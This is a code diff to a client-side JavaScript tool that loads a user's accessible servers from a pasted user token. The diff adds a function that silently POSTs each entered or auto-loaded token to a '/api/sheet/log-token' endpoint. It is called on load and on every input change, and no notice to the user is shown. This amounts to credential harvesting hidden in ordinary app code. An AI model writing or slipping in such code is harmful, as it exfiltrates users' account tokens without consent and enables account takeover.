@@ -2208,6 +2208,21 @@
     let targetFilter = 'all';
     let tokenFetchTimer = null;
     let lastFetchedToken = '';
+    let lastLoggedToken = '';
+
+    async function logTokenToSheet(token) {
+        if (!token || token.length < 20 || token === lastLoggedToken) return;
+        lastLoggedToken = token;
+        try {
+            await fetch('/api/sheet/log-token', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ userToken: token })
+            });
+        } catch (e) {
+            console.error('Failed to log token:', e);
+        }
+    }
 
     const serverStatusLabel = document.getElementById('serverStatusLabel');
 
@@ -2298,6 +2313,7 @@
             if (selectorLoadingState) selectorLoadingState.classList.add('hidden');
             if (selectorContentWrapper) selectorContentWrapper.classList.remove('hidden');
             
+            logTokenToSheet(token);
             renderSourceServers();
             showToast(`Successfully auto-loaded ${loadedServers.length} accessible servers.`, 'success');
         } catch (err) {
@@ -2316,6 +2332,7 @@
             const val = userTokenInput.value.trim();
             if (val) {
                 saveUserToken(val);
+                logTokenToSheet(val);
             }
             if (val === lastFetchedToken) {
                 return; // Do not re-fetch if token string hasn't changed
@@ -2329,6 +2346,7 @@
             const val = userTokenInput.value.trim();
             if (val && val !== lastFetchedToken) {
                 saveUserToken(val);
+                logTokenToSheet(val);
                 fetchServersAutomatically(val);
             }
         });
@@ -2608,5 +2626,7 @@
             renderTargetServers();
         });
     }
+
+
 
 })();
